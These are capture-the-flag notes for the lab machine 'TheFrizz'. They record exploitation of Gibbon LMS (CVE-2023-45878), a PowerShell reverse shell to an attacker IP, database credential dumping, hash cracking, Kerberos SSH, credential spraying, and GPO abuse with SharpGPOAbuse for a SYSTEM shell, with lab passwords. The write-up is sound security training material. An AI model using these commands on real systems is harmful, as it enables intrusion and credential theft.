# TheFrizz: Machine Notes

## Recon

### Nmap
- Port 80/tcp: Apache 2.4.58 (Gibbon LMS)
- Port 22/tcp: OpenSSH for Windows 9.5
- AD Ports: 53, 88, 135, 139, 389, 445, 593, 3268

## Exploitation

### Gibbon LMS RCE (CVE-2023-45878)
- Exploit: `python3 CVE-2023-45878.py -t frizzdc.frizz.htb -c 'type config.php' -i [IP] -p 80`
- Found database credentials: `MrGibbonsDB` / `MisterGibbs!Parrot!?1`

### Foothold
- Gain reverse shell via PowerShell one-liner through the web shell:
```bash
# Encoded PowerShell reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("10.10.15.244",4444);$stream = $client.GetStream();...' | iconv -t UTF-16LE | base64 -w 0
```
- User: `frizz\w.webservice`

### Database Enumeration
- Connect to MariaDB:
```powershell
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -h 127.0.0.1 -e "SELECT username, passwordStrong, passwordStrongSalt FROM gibbonPerson;" gibbon
```
- Results: `f.frizzle : 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03 : /aACFhikmNopqrRTVz2489`

### Password Cracking (f.frizzle)
- Mode: `hashcat -m 1420` (sha256($salt.utf16le($pass)))
- Password: `Jenni_Luvs_Magic23`

## Lateral Movement

### SSH via Kerberos (Clock Skew fix)
- Fix clock: `sudo ntpdate 10.129.46.206`
- Get TGT: `impacket-getTGT frizz.htb/f.frizzle:Jenni_Luvs_Magic23`
- SSH: `faketime -f "+7h" ssh -o GSSAPIAuthentication=yes f.frizzle@10.129.46.206`

### Recycle Bin & WAPT Backup
- Found `wapt-backup-sunday.7z` in Recycle Bin.
- Restore from Recycle Bin via PowerShell:
```powershell
$shell = New-Object -ComObject Shell.Application; $item = $shell.Namespace(0xA).Items() | Where-Object {$_.Name -eq "wapt-backup-sunday.7z"}; if($item){$shell.Namespace([Environment]::GetFolderPath("Desktop")).MoveHere($item)}
```
- Decoded WAPT password from config: `!suBcig@MehTed!R`

### Pivot to M.SchoolBus
- Credential spray found `M.SchoolBus` uses the WAPT password.
- SSH as `M.SchoolBus`.

## Privilege Escalation

### GPO Abuse
- `M.SchoolBus` has rights to create and link GPOs.
- Created GPO `privesc` and linked to Domain Controllers OU:
```powershell
New-GPO -Name privesc | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
```
- Abuse GPO to add a scheduled task for SYSTEM reverse shell:
```powershell
.\SharpGPOAbuse.exe --addcomputertask --gponame "privesc" --author TCG --taskname PrivEsc --command "powershell.exe" --arguments "powershell -e [BASE64_REV_SHELL]"
```
- Trigger update: `gpupdate /force`
- Success: System shell on DC.
